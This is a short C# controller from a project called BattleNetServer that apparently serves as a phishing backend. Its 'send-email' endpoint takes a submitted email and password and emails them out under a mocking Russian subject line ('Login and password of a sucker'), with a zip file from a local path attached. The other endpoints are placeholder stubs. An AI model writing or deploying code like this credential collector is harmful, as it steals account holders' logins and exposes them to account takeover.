using BattleNetServer.Attribuets;
using BattleNetServer.Model;
using BattleNetServer.Services;


namespace BattleNetServer.Controllers;

[Controller("authorize")]
public class AuthorizeController
{
    [Post("send-email")]
    public void SendToEmail(string emailUser, string passwordUser)
    {
        new MessageSenderService().SendEmail(emailUser, passwordUser, "Логин и пароль лоха", "C:\\Users\\irina\\OneDrive\\Рабочий стол\\BattleNetServer.zip");
        Console.WriteLine("Электронное письмо было отправлено.");
    }
    [Get("email-List")]
    public string GetEmailList()
    {
        var htmlCode = "<h1>Вы открыли метод GetEmailList</h1>";
        return htmlCode;
    }
    
    [Get("account-sList")]
    public Account[] GetAccountsList()
    {
        var accounts = new[]
        {
            new Account(){Email = "email-1", Password = "password-1"},
            new Account(){Email = "email-2", Password = "password-2"},
        };
        
        return accounts;
    }
}